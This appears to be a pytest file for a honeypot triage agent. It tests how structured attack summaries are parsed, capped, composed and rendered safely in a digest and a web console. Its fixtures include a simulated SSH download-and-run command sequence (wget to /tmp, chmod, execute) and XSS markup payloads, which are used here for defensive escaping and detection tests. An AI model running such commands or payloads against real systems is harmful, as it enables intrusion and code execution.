"""The analyst's narrative in parts: schema caps, forgiving parsing of the parts, the
composed paragraph, the rule-based fill, the digest layout and the console's layout data,
with old records (no parts) still read and shown as a paragraph."""

import datetime
import json
import re
from pathlib import Path

import pytest
from pydantic import ValidationError

from agent_fakes import GOOD_TRIAGE, FakeJsonLLM, ssh_session, trap_event, write_log
from agents.triage import (
    HEADLINE_MAX,
    ITEM_MAX,
    NOT_SEEN_ITEM_MAX,
    TriageModelOutput,
    TriageRecord,
    compose_narrative,
    digest,
    load_records,
    record_facts,
    record_layout,
    run_triage,
    write_record,
)
from agents.ui.api import Api, ApiPaths

UTC = datetime.timezone.utc
NOW = datetime.datetime(2026, 11, 1, 18, 0, tzinfo=UTC)
DAY = "2026-11-01"
STATIC = Path(__file__).resolve().parents[1] / "agents" / "ui" / "static"

PARTS = {
    "headline": "Toll-fraud probing over SIP",
    "actions": ["Sent the same call repeatedly with different dialing prefixes (00, 011, 9)."],
    "assessment": ["Automated search for a prefix that routes an outbound call.",
                   "The number is probably the caller's own test line."],
    "not_seen": ["authentication attempts", "payloads"],
}
MARKUP = '<img src=x onerror=alert(1)>`|**bold**|[link](http://evil.example)<script>x</script>'


def _run(tmp_path, records, llm=None):
    log = write_log(tmp_path / "events.jsonl", records)
    reports = tmp_path / "reports"
    result = run_triage(log, reports, llm, now=NOW)
    return result, reports


def _base(**kw):
    out = dict(kind="campaign", id="c1", protocol="sip", src_ip="198.51.100.7",
               first_seen=f"{DAY}T12:00:00+00:00", intent="TOLL_FRAUD", stage="IMPACT",
               skill="AUTOMATED", judgement="MALICIOUS", narrative="A paragraph.")
    out.update(kw)
    return out


def _sip_toll_fraud(ip="198.51.100.7"):
    return [trap_event("sip", "invite", ip, f"s{i}", minutes=i * 0.1, client="examplesip",
                       data={"dialed": prefix + "15550100", "registered": False})
            for i, prefix in enumerate(["00", "011", "9", "", "00"])]


# ---- schema ---------------------------------------------------------------------------------

def test_model_output_parts_are_clipped_and_counted():
    out = TriageModelOutput.model_validate({
        **GOOD_TRIAGE,
        "headline": "H" * 500,
        "actions": [f"action {i} " + "a" * 400 for i in range(12)],
        "assessment": [f"meaning {i}" for i in range(9)],
        "not_seen": ["n" * 200] + [f"thing {i}" for i in range(9)],
    })
    assert len(out.headline) == HEADLINE_MAX
    assert len(out.actions) == 5 and all(len(a) <= ITEM_MAX for a in out.actions)
    assert len(out.assessment) == 4
    assert len(out.not_seen) == 5 and len(out.not_seen[0]) == NOT_SEEN_ITEM_MAX
    assert out.narrative == GOOD_TRIAGE["narrative"]


def test_model_output_parts_become_one_plain_line():
    out = TriageModelOutput.model_validate({
        **GOOD_TRIAGE, "headline": "a\nb\tc‮d\x00e",
        "actions": ["  x\r\n y  ", "", "   ", "x y"]})
    assert out.headline == "a b c d e"
    assert out.actions == ["x y"]           # blanks dropped, duplicates folded


@pytest.mark.parametrize("bad", [
    {"headline": ["not", "a", "string"], "actions": "a string, not a list",
     "assessment": {"a": 1}, "not_seen": 7},
    {"headline": None, "actions": [1, 2.5, None, {"x": 1}, ["nested"]],
     "assessment": None, "not_seen": [True]},
])
def test_malformed_parts_are_empty_and_the_classification_survives(bad):
    out = TriageModelOutput.model_validate({**GOOD_TRIAGE, **bad})
    assert out.headline == "" and out.actions == [] and out.assessment == [] and out.not_seen == []
    assert out.judgement.value == "MALICIOUS" and out.narrative == GOOD_TRIAGE["narrative"]


def test_record_parts_have_caps_and_old_records_still_validate():
    TriageRecord(**_base(**PARTS))
    old = TriageRecord(**_base())
    assert old.headline == "" and old.actions == [] and not old.structured
    for over in ({"headline": "h" * (HEADLINE_MAX + 1)},
                 {"actions": ["a"] * 6}, {"assessment": ["a"] * 5}, {"not_seen": ["n"] * 6},
                 {"actions": ["a" * (ITEM_MAX + 1)]},
                 {"not_seen": ["n" * (NOT_SEEN_ITEM_MAX + 1)]},
                 {"clients": ["c"] * 4}, {"clients": ["c" * 81]}):
        with pytest.raises(ValidationError):
            TriageRecord(**_base(**over))


# ---- composition of the paragraph -----------------------------------------------------------

def test_compose_narrative_reads_as_sentences_and_is_capped():
    text = compose_narrative(**PARTS)
    assert text.startswith("Toll-fraud probing over SIP. Sent the same call")
    assert text.endswith("Not seen: authentication attempts, payloads.")
    assert compose_narrative("", [], [], []) == ""
    assert len(compose_narrative("h" * 100, ["a" * 160] * 5, ["b" * 160] * 4, [])) == 600


def test_session_with_parts_and_no_paragraph_gets_a_composed_narrative(tmp_path):
    reply = {k: v for k, v in GOOD_TRIAGE.items() if k != "narrative"} | PARTS
    recs = ssh_session("session-p", "203.0.113.7", ["uname -a"])
    _, reports = _run(tmp_path, recs, FakeJsonLLM(reply))
    rec = TriageRecord.model_validate_json((reports / "sessions" / "session-p.json").read_text())
    assert rec.structured and rec.headline == PARTS["headline"] and rec.actions == PARTS["actions"]
    assert rec.narrative == compose_narrative(**PARTS)


def test_model_paragraph_is_kept_when_given(tmp_path):
    recs = ssh_session("session-q", "203.0.113.7", ["uname -a"])
    _, reports = _run(tmp_path, recs, FakeJsonLLM(GOOD_TRIAGE | PARTS))
    rec = TriageRecord.model_validate_json((reports / "sessions" / "session-q.json").read_text())
    assert rec.narrative == GOOD_TRIAGE["narrative"] and rec.headline == PARTS["headline"]


def test_reply_without_parts_or_paragraph_still_yields_a_filled_narrative(tmp_path):
    reply = {k: v for k, v in GOOD_TRIAGE.items() if k != "narrative"}
    recs = ssh_session("session-r", "203.0.113.7", ["uname -a"])
    _, reports = _run(tmp_path, recs, FakeJsonLLM(reply))
    rec = TriageRecord.model_validate_json((reports / "sessions" / "session-r.json").read_text())
    assert rec.narrative.startswith("ssh session with 1 commands") and not rec.structured


def test_malformed_parts_in_a_reply_still_write_the_record(tmp_path):
    reply = GOOD_TRIAGE | {"headline": 42, "actions": "oops", "not_seen": [None]}
    recs = ssh_session("session-m", "203.0.113.7", ["uname -a"])
    result, reports = _run(tmp_path, recs, FakeJsonLLM(reply))
    assert result["written"] == ["session-m"]
    rec = TriageRecord.model_validate_json((reports / "sessions" / "session-m.json").read_text())
    assert rec.narrative == GOOD_TRIAGE["narrative"] and not rec.structured


def test_campaign_model_parts_reach_the_record(tmp_path):
    recs = _sip_toll_fraud()
    reply = {**GOOD_TRIAGE, "intent": "TOLL_FRAUD", "stage": "IMPACT", "narrative": ""} | PARTS
    _, reports = _run(tmp_path, recs, FakeJsonLLM(reply))
    (rec,) = load_records(reports)
    assert rec.llm_used and rec.headline == PARTS["headline"]
    assert rec.narrative == compose_narrative(**PARTS)
    assert rec.clients == ["examplesip"]


def test_prompt_asks_for_the_parts_and_not_for_numbers():
    from agents.triage import SYSTEM_PROMPT
    for word in ("headline", "actions", "assessment", "not_seen"):
        assert word in SYSTEM_PROMPT
    assert "code adds those" in SYSTEM_PROMPT


# ---- rule-based fill ------------------------------------------------------------------------

def test_rule_based_campaign_fills_the_parts(tmp_path):
    _, reports = _run(tmp_path, _sip_toll_fraud())
    (rec,) = load_records(reports)
    assert not rec.llm_used and rec.structured
    assert rec.headline == "Toll-fraud probing over SIP"
    assert rec.actions == ["Dialed 5 outside numbers"]
    assert any("outbound calls" in a for a in rec.assessment)
    assert "login attempts" in rec.not_seen and "honeytoken use" in rec.not_seen
    facts = record_facts(rec)
    assert facts["who"] == ["198.51.100.7", 'client "examplesip"']
    assert facts["volume"][:3] == ["5 connections", "no login attempts", "5 requests"]
    assert facts["target"][0] == "number 0015550100" and facts["target"][-1] == "1 more number"


def test_rule_based_brute_force_fills_the_parts(tmp_path):
    recs = [trap_event("mysql", "auth_attempt", "192.0.2.10", f"m{i}", minutes=i,
                       username=f"user{i}", password="123456") for i in range(5)]
    _, reports = _run(tmp_path, recs)
    (rec,) = load_records(reports)
    assert rec.headline == "Password guessing over MYSQL"
    assert rec.actions == ["Tried 5 logins with 5 usernames and 1 passwords"]
    assert "a successful login" in rec.not_seen
    assert any("spraying" in a for a in rec.assessment)
    assert record_facts(rec)["target"][:3] == ["user user0", "user user1", "user user2"]


def test_rule_based_session_fills_the_parts(tmp_path):
    recs = ssh_session("session-n", "203.0.113.8",
                       ["wget http://198.51.100.9/x -O /tmp/.x", "chmod +x /tmp/.x; /tmp/.x"])
    _, reports = _run(tmp_path, recs)
    rec = TriageRecord.model_validate_json((reports / "sessions" / "session-n.json").read_text())
    assert not rec.llm_used and rec.structured
    assert rec.headline == "Download and run over SSH"
    assert "Tried to fetch a file and run it" in rec.actions
    assert rec.narrative.startswith("ssh session with 2 commands")     # paragraph unchanged


# ---- digest ---------------------------------------------------------------------------------

def test_digest_lays_out_structured_records_and_keeps_old_ones_as_a_paragraph(tmp_path):
    reports = tmp_path / "reports"
    write_record(TriageRecord(**_base(id="new", clients=["examplesip"], **PARTS),
                              credentials={"dialed_numbers": [("+1 555 0100", 632)]}), reports)
    write_record(TriageRecord(**_base(id="old", src_ip="203.0.113.5", judgement="SUSPICIOUS",
                                      narrative="An old paragraph.")), reports)
    text = digest(reports, day=DAY, dry_run=True)
    assert "   - **`Toll-fraud probing over SIP`** (MALICIOUS)" in text
    assert '   - Who: `198.51.100.7`, `client "examplesip"`' in text
    assert "   - Volume: 1 connection, no login attempts" in text
    assert "   - Target: `number +1 555 0100`" in text
    assert "   - What they did\n     - `Sent the same call" in text
    assert "   - What it means\n     - `Automated search" in text
    assert "   - Not seen: `authentication attempts`, `payloads`" in text
    assert "   - `An old paragraph.`" in text


def test_digest_escapes_markup_in_every_part(tmp_path):
    reports = tmp_path / "reports"
    write_record(TriageRecord(**_base(
        headline=MARKUP[:100], actions=[MARKUP], assessment=[MARKUP], not_seen=[MARKUP[:60]],
        clients=[MARKUP[:80]], username=MARKUP)), reports)
    text = digest(reports, day=DAY, dry_run=True)
    top = text.split("## Top three needing attention")[1].split("## ")[0]
    for line in top.splitlines()[2:]:
        if "<" in line or "**bold**" in line:
            # Every such value sits inside a code span: an even number of backticks before it
            # and no raw backtick or table pipe from the value itself.
            assert re.fullmatch(r"[^`]*(`[^`]*`[^`]*)+", line), line
            assert "\\|" in line and "`|" not in line.replace("\\|", "")


# ---- console --------------------------------------------------------------------------------

def _api(tmp_path, reports):
    root = tmp_path
    (root / "data").mkdir(exist_ok=True)
    log = root / "events.jsonl"
    log.touch()
    paths = ApiPaths(reports=reports, state=reports / "state", log=log, data=root / "data",
                     detections=root / "detections", overlay=root / "overlay.json",
                     source_state=root / "source_state.json", playbooks=root / "playbooks")
    return Api(paths, cache_seconds=0)


def test_console_serves_the_layout_with_markup_kept_as_data(tmp_path):
    reports = tmp_path / "reports"
    rec = TriageRecord(**_base(id="hostile", headline=MARKUP[:100], actions=[MARKUP],
                               assessment=[MARKUP], not_seen=[MARKUP[:60]],
                               clients=[MARKUP[:80]], username=MARKUP))
    write_record(rec, reports)
    api = _api(tmp_path, reports)
    status, body = api.get("/api/records/hostile", {})
    assert status == 200
    layout = body["layout"]
    assert layout["structured"] is True and layout["headline"] == MARKUP[:100]
    assert layout["actions"] == [MARKUP] and layout["assessment"] == [MARKUP]
    assert layout["not_seen"] == [MARKUP[:60]]
    assert f'client "{MARKUP[:80]}"' in layout["who"] and f"user {MARKUP[:80]}" in layout["who"]
    status, page = api.get("/api/records", {})
    assert page["items"][0]["layout"] == layout


def test_console_serves_old_records_without_parts(tmp_path):
    reports = tmp_path / "reports"
    old = {k: v for k, v in TriageRecord(**_base(id="old")).model_dump(mode="json").items()
           if k not in ("headline", "actions", "assessment", "not_seen", "clients")}
    (reports / "campaigns").mkdir(parents=True)
    (reports / "campaigns" / "old.json").write_text(json.dumps(old))
    api = _api(tmp_path, reports)
    status, body = api.get("/api/records/old", {})
    assert status == 200
    assert body["layout"]["structured"] is False and body["layout"]["narrative"] == "A paragraph."
    assert record_layout(load_records(reports)[0])["who"] == ["198.51.100.7"]


def _function(source: str, name: str) -> str:
    start = source.index(f"function {name}(")
    end = source.index("\n  }\n", start)
    return source[start:end]


def test_console_renders_the_layout_as_text_only():
    js = (STATIC / "app.js").read_text(encoding="utf-8")
    body = _function(js, "narrativeView")
    # Values only ever reach the page as text nodes: no attributes, no HTML sinks.
    assert "attrs" not in body and "innerHTML" not in body and "insertAdjacent" not in body
    assert body.count("text:") >= 6
    # Old records fall back to the paragraph.
    assert "l.structured !== true" in body and "textBlock(narrative)" in body
    # Every place that showed a narrative now goes through it (the records table keeps one
    # clipped line: the headline, or the paragraph for old records).
    assert js.count("narrativeView(") == 4
    assert "text: str(r.narrative) }" not in js and "text: str(record.narrative) }" not in js
